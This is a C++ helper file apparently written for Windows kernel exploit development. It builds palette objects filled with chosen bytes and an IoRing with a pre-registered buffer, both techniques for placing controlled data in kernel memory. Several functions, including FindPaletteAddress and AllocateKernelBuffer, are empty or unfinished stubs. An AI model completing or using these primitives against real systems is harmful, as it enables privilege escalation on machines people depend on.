#include "Utils.h"
#include <ioringapi.h>

std::unique_ptr<LOGPALETTE> CraftEmptyPalette(size_t Length)
{
    // Round the length up to a multiple of PALETTEENTRY
    size_t roundedLength = (Length + sizeof(PALETTEENTRY) - 1) / sizeof(PALETTEENTRY) * sizeof(PALETTEENTRY);

    auto* palette = reinterpret_cast<LOGPALETTE*>(new Byte[sizeof(LOGPALETTE) + roundedLength]);
    return std::unique_ptr<LOGPALETTE>(palette);
}

std::unique_ptr<LOGPALETTE> CraftInitializedPalette(std::span<Byte> Data)
{
    // Round the length up to a multiple of PALETTEENTRY
    size_t roundedLength = (Data.size() + sizeof(PALETTEENTRY) - 1) / sizeof(PALETTEENTRY) * sizeof(PALETTEENTRY);

    auto* palette = reinterpret_cast<LOGPALETTE*>(new Byte[sizeof(LOGPALETTE) + roundedLength]);
    
    auto* paletteData = reinterpret_cast<Byte*>(palette->palPalEntry);
    for (Byte byte : Data) {
        *paletteData++ = byte;
    }

    return std::unique_ptr<LOGPALETTE>(palette);
}

kAddress FindPaletteAddress(HPALETTE Palette) 
{

}

HIORING CreateIoRingWithBuffer(std::span<Byte> Data)
{
    HIORING ioRing = nullptr;

    HRESULT hr = CreateIoRing(
        IORING_VERSION_3,
        { IORING_CREATE_REQUIRED_FLAGS_NONE, IORING_CREATE_ADVISORY_FLAGS_NONE },
        0x10000,
        0x10000,
        &ioRing);

    if (FAILED(hr)) { 
        return nullptr; 
    }

    IORING_BUFFER_INFO buffer = { Data.data(), Data.size() };
    hr = BuildIoRingRegisterBuffers(
        ioRing,
        1,
        &buffer,
        0x1337
    );

    if (FAILED(hr)) {
        return nullptr;
    }

    return ioRing;
}


//kAddress GetPreregisteredBufferFromIoRing()


optional<kAddress> Utils::AllocateKernelBuffer(size_t Length)
{


    return kAddress();
}

optional<kAddress> Utils::AllocateKernelBuffer(std::span<const Byte> Data)
{
    return optional<kAddress>();
}
